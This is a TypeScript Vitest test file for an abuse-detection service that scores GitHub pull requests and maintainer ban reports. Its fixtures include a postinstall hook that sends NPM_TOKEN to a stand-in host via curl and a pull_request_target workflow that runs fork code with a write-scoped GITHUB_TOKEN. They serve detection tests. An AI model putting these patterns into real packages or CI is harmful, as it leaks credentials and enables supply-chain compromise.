import { describe, expect, it, vi } from "vitest";

const loadValidation = () => {
	vi.resetModules();
	vi.stubEnv("OPENROUTER_API_KEY", "");
	return import("./validation");
};

describe("validateReportWithOpenRouter", () => {
	it("keeps severe command-only reports in review", async () => {
		const { validateReportWithOpenRouter } = await loadValidation();

		const result = await validateReportWithOpenRouter({
			commandText: "ban this user reason: malicious code attempt",
			pullRequest: {
				body: "Production smoke test fixture.",
				title: "OSS Protector production smoke test",
				url: "https://github.com/lord007tn/oss-protector-e2e/pull/12",
			},
			reasonText: "ban this user reason: malicious code attempt",
			reporterAssociation: "OWNER",
			reporterIsMaintainer: true,
			targetLogin: "lord007tn",
		});

		expect(result.status).toBe("needs_review");
		expect(result.verdict).toBe("unclear");
		expect(result.confidence).toBeLessThanOrEqual(64);
	});

	it("allows validation when pull request context corroborates the report", async () => {
		const { validateReportWithOpenRouter } = await loadValidation();

		const result = await validateReportWithOpenRouter({
			commandText: "ban this user reason: malicious code attempt",
			pullRequest: {
				body: "Patch adds a base64 encoded backdoor and token exfiltration.",
				title: "Suspicious credential handling",
				url: "https://github.com/lord007tn/oss-protector-e2e/pull/12",
			},
			reasonText: "ban this user reason: malicious code attempt",
			reporterAssociation: "OWNER",
			reporterIsMaintainer: true,
			targetLogin: "lord007tn",
		});

		expect(result.status).toBe("validated");
		expect(result.verdict).toBe("likely_abuse");
	});

	it("keeps corroborated non-maintainer reports in review until a maintainer confirms", async () => {
		const { validateReportWithOpenRouter } = await loadValidation();

		const result = await validateReportWithOpenRouter({
			commandText: "@oss-protector block this user malicious code",
			pullRequest: {
				body: "Patch adds a postinstall script that uploads process.env.NPM_TOKEN.",
				title: "Improve install flow",
				url: "https://github.com/nodejs/node/pull/12",
			},
			reasonText: "@oss-protector block this user malicious code",
			reporterAssociation: "NONE",
			reporterIsMaintainer: false,
			targetLogin: "unknown-contributor",
		});

		expect(result.status).toBe("needs_review");
		expect(result.verdict).toBe("unclear");
		expect(result.confidence).toBeLessThanOrEqual(64);
	});
});

describe("validatePullRequestWithOpenRouter", () => {
	it("flags concrete malicious lifecycle and credential exfiltration signals", async () => {
		const { validatePullRequestWithOpenRouter } = await loadValidation();

		const result = await validatePullRequestWithOpenRouter({
			body: "Adds install helper.",
			files: [
				{
					additions: 5,
					changes: 5,
					deletions: 0,
					filename: "package.json",
					patch:
						'+ "postinstall": "node -e \\"require(\'child_process\').exec(\'curl https://example.test?token=\'+process.env.NPM_TOKEN)\\""',
					status: "modified",
				},
			],
			targetLogin: "suspicious-user",
			title: "Improve install flow",
			url: "https://github.com/lord007tn/oss-protector-e2e/pull/20",
		});

		expect(result.verdict).toBe("likely_abuse");
		expect(result.reasonCode).toBe("malicious_code");
		expect(result.confidence).toBeGreaterThanOrEqual(75);
		expect(result.scoreBreakdown?.maliciousRisk).toBeGreaterThanOrEqual(80);
	});

	it("keeps low-value bounty farming as review-needed instead of validated abuse", async () => {
		const { validatePullRequestWithOpenRouter } = await loadValidation();

		const result = await validatePullRequestWithOpenRouter({
			body: "Claiming bounty contribution for this quick update.",
			files: [
				{
					additions: 1,
					changes: 1,
					deletions: 0,
					filename: "README.md",
					patch: "+ Minor update",
					status: "modified",
				},
			],
			targetLogin: "farming-user",
			title: "Small contribution for reward",
			url: "https://github.com/lord007tn/oss-protector-e2e/pull/21",
		});

		expect(result.verdict).toBe("unclear");
		expect(result.reasonCode).toBe("fake_bounty");
		expect(result.scoreBreakdown?.farmingRisk).toBeGreaterThanOrEqual(60);
	});

	it("does not flag a scoped useful typo fix", async () => {
		const { validatePullRequestWithOpenRouter } = await loadValidation();

		const result = await validatePullRequestWithOpenRouter({
			body: "Fixes a typo in the setup docs.",
			files: [
				{
					additions: 1,
					changes: 2,
					deletions: 1,
					filename: "README.md",
					patch: "- instal\n+ install",
					status: "modified",
				},
			],
			targetLogin: "helpful-user",
			title: "Fix typo in README",
			url: "https://github.com/lord007tn/oss-protector-e2e/pull/22",
		});

		expect(result.verdict).toBe("not_enough_evidence");
		expect(result.confidence).toBe(0);
	});

	it("does not treat harmless webhook documentation as credential phishing", async () => {
		const { validatePullRequestWithOpenRouter } = await loadValidation();

		const result = await validatePullRequestWithOpenRouter({
			body: "Adds docs for webhook signature verification.",
			files: [
				{
					additions: 8,
					changes: 8,
					deletions: 0,
					filename: "docs/webhooks.md",
					patch:
						"+ Configure a webhook endpoint in GitHub settings.\n+ Store the webhook secret in your deployment provider.\n+ The endpoint validates signatures before processing events.",
					status: "modified",
				},
			],
			targetLogin: "docs-contributor",
			title: "docs: explain webhook setup",
			url: "https://github.com/expressjs/express/pull/23",
		});

		expect(result.verdict).toBe("not_enough_evidence");
		expect(result.reasonCode).not.toBe("credential_phishing");
		expect(result.scoreBreakdown?.credentialRisk).toBe(0);
	});

	it("flags pull_request_target workflows that run untrusted fork code with repo token context", async () => {
		const { validatePullRequestWithOpenRouter } = await loadValidation();

		const result = await validatePullRequestWithOpenRouter({
			body: "Unblocks tests from forks.",
			files: [
				{
					additions: 14,
					changes: 14,
					deletions: 0,
					filename: ".github/workflows/ci.yml",
					patch:
						"+on: pull_request_target\n+jobs:\n+  test:\n+    permissions:\n+      contents: write\n+    steps:\n+      - uses: actions/checkout@v4\n+        with:\n+          ref: $" +
						"{{ github.event.pull_request.head.sha }}\n+      - run: npm install && npm test\n+        env:\n+          GITHUB_TOKEN: $" +
						"{{ secrets.GITHUB_TOKEN }}",
					status: "modified",
				},
			],
			targetLogin: "workflow-attacker",
			title: "ci: make PR checks run with repository token",
			url: "https://github.com/nodejs/node/pull/24",
		});

		expect(result.verdict).toBe("likely_abuse");
		expect(result.reasonCode).toBe("malicious_code");
		expect(result.confidence).toBeGreaterThanOrEqual(80);
		expect(result.causes).toContain(
			"Privileged workflow executes untrusted PR code"
		);
	});
});
